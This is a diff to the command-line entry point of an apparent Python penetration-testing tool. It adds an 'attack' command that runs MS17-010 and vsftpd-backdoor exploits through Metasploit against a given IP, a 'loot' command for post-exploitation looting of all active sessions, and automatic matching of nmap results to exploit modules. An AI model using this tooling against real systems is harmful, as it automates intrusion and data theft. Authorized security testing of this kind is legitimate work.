@@ -8,9 +8,11 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 from .config import ConfigError, load_config
+from .exploit_matcher import ExploitMatcher
 from .inference import infer_findings, load_rules
 from .inventory import build_inventory, write_inventory
 from .logging_setup import configure_logging
+from .loot import AutoLoot
 from .metasploit import MetasploitIntegration
 from .nmap_scanner import NmapScanner
 from .payload import generate_payload
@@ -24,6 +26,7 @@ from .report import (
     write_text_report,
 )
 from .scanner import expand_targets, scan_targets
+from .targeted_attacks import TargetedAttacker
 from .web import start_web_server
 
 
@@ -103,6 +106,11 @@ def main(argv: list[str] | None = None) -> int:
     brute_parser.add_argument("--pass-file", required=True, help="Path to password file")
 
     subparsers.add_parser("sessions", help="List active Metasploit sessions.")
+    subparsers.add_parser("loot", help="Run post-exploitation loot on all active sessions.")
+    
+    attack_parser = subparsers.add_parser("attack", help="Run a targeted attack.")
+    attack_parser.add_argument("--type", required=True, choices=["ms17-010", "vsftpd"], help="Type of attack")
+    attack_parser.add_argument("--target", required=True, help="Target IP address")
 
     args = parser.parse_args(argv)
     configure_logging(args.verbose)
@@ -152,6 +160,25 @@ def main(argv: list[str] | None = None) -> int:
             print(json.dumps(result, indent=2))
         return 0
 
+    if args.command == "attack":
+        msf = MetasploitIntegration(config.metasploit)
+        if msf.connect():
+            attacker = TargetedAttacker(msf)
+            if args.type == "ms17-010":
+                result = attacker.attack_ms17_010(args.target)
+            elif args.type == "vsftpd":
+                result = attacker.attack_vsftpd_backdoor(args.target)
+            print(json.dumps(result, indent=2))
+        return 0
+
+    if args.command == "loot":
+        msf = MetasploitIntegration(config.metasploit)
+        if msf.connect():
+            looter = AutoLoot(msf, config.output.directory)
+            results = looter.loot_all_sessions()
+            print(json.dumps(results, indent=2))
+        return 0
+
     plan = {
         "targets": [{"host": target.host, "ip": target.ip} for target in targets],
         "ports": config.scan.ports,
@@ -170,11 +197,10 @@ def main(argv: list[str] | None = None) -> int:
     except KeyboardInterrupt:
         return 130
 
-    # Nmap Integration
+    # Nmap Integration & Auto-Exploit Matching
     if config.nmap.enabled:
         nmap_scanner = NmapScanner(arguments=config.nmap.arguments, sudo=config.nmap.sudo)
         if nmap_scanner.is_available():
-            # Collect all open ports
             hosts_to_scan = []
             ports_to_scan = set()
             for scan in scans:
@@ -185,10 +211,16 @@ def main(argv: list[str] | None = None) -> int:
             
             if hosts_to_scan:
                 nmap_results = nmap_scanner.scan(hosts_to_scan, list(ports_to_scan))
-                # Here we could merge nmap results into the inventory, but for now we just print them
-                # or save them to a separate file.
-                # Ideally, we would update the 'scans' objects with better service info.
                 print(f"Nmap scan completed. Results available for {len(nmap_results)} hosts.")
+                
+                # Auto-Exploit Matching
+                matcher = ExploitMatcher(Path("data/exploit_db.json"))
+                for host, data in nmap_results.items():
+                    potential_exploits = matcher.find_exploits_for_host(data)
+                    if potential_exploits:
+                        print(f"\n[!] Potential Exploits for {host}:")
+                        for exploit in potential_exploits:
+                            print(f"    - {exploit['service']} {exploit['version']} -> {exploit['module']} (Rank: {exploit['rank']})")
 
     inventory = build_inventory(scans)
 
